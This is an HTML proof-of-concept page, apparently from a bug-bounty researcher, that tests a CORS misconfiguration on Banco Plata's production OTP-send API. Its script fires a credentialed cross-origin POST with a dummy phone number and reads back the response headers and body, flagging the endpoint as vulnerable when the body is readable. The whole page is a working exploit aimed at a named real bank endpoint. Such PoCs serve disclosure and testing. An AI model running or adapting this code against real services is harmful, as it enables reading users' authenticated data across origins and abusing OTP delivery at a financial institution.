<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS PoC - Banco Plata</title>
    <style>
        body {
            background: #0d1117;
            color: #c9d1d9;
            font-family: monospace;
            padding: 20px;
            max-width: 800px;
            margin: 0 auto;
        }
        h1 { color: #f85149; font-size: 18px; }
        .info { color: #8b949e; font-size: 13px; }
        button {
            background: #f85149;
            color: #fff;
            border: none;
            padding: 12px 24px;
            font-size: 14px;
            cursor: pointer;
            border-radius: 6px;
            margin: 16px 0;
        }
        button:hover { background: #da3633; }
        button:disabled { background: #333; cursor: not-allowed; }
        #log {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 8px;
            padding: 20px;
            font-size: 13px;
            line-height: 1.6;
            white-space: pre-wrap;
            word-break: break-all;
        }
        .green { color: #3fb950; }
        .red { color: #f85149; }
        .blue { color: #58a6ff; }
        .gray { color: #8b949e; }
    </style>
</head>
<body>
    <h1>CORS Misconfiguration PoC</h1>
    <p class="info">Target: Banco Plata OTP Endpoint</p>
    <p class="info">Researcher: lazushunting</p>
    <p class="info">This page proves HTTPS origin can read cross-origin response.</p>

    <button id="btnTest" onclick="runTest()">▶ Run Test (Click to Send)</button>

    <div id="log">
        <span class="gray">Awaiting test... Click button to verify CORS.</span>
    </div>

    <script>
        const LOG = document.getElementById('log');
        const BTN = document.getElementById('btnTest');
        const TEST_PHONE = '+52 55 1111 2222'; // Nomor dummy untuk testing

        function log(msg, color) {
            LOG.innerHTML += '\n' + msg;
            LOG.scrollTop = LOG.scrollHeight;
        }

        async function runTest() {
            BTN.disabled = true;
            BTN.textContent = '⏳ Testing...';
            LOG.innerHTML = '';

            log('<span class="blue">=== CORS Exploitation Test ===</span>');
            log('<span class="gray">Origin: ' + window.location.origin + '</span>');
            log('<span class="gray">Target: prime.bancoplata.mx/auth/api/v1/auth-flow/otp/send</span>');
            log('');

            try {
                log('<span class="blue">[1] Sending CORS request with credentials: include...</span>');

                const response = await fetch(
                    'https://prime.bancoplata.mx/auth/api/v1/auth-flow/otp/send',
                    {
                        method: 'POST',
                        credentials: 'include',
                        headers: {
                            'content-type': 'application/json',
                            'accept': 'application/json',
                            'x-plata-locale': 'es',
                            'x-plata-device-os': 'webMobile'
                        },
                        body: JSON.stringify({
                            phoneNumber: TEST_PHONE,
                            installationId: 'gh-poc-' + Date.now()
                        })
                    }
                );

                log('<span class="green">[2] Response received!</span>');
                log('<span class="gray">HTTP Status: ' + response.status + '</span>');

                // Cek header CORS
                const acao = response.headers.get('access-control-allow-origin');
                const acac = response.headers.get('access-control-allow-credentials');

                log('<span class="gray">Access-Control-Allow-Origin: ' + (acao || 'null') + '</span>');
                log('<span class="gray">Access-Control-Allow-Credentials: ' + (acac || 'null') + '</span>');

                // Baca body
                const data = await response.json();
                log('');
                log('<span class="red">[!!!] BODY READABLE: YES</span>');
                log('<span class="red">[!!!] CORS IS VULNERABLE</span>');
                log('');
                log('<span class="gray">Response Data:</span>');
                log(JSON.stringify(data, null, 2));

            } catch (err) {
                log('');
                if (err.message.includes('Failed to fetch') || err.message.includes('NetworkError')) {
                    log('<span class="green">[SAFE] CORS BLOCKED by browser</span>');
                    log('<span class="gray">This origin CANNOT read the response.</span>');
                    log('<span class="gray">Error: ' + err.message + '</span>');
                } else {
                    log('<span class="red">Error: ' + err.message + '</span>');
                }
            } finally {
                BTN.disabled = false;
                BTN.textContent = '▶ Run Test Again';
            }
        }
    </script>
</body>
</html>
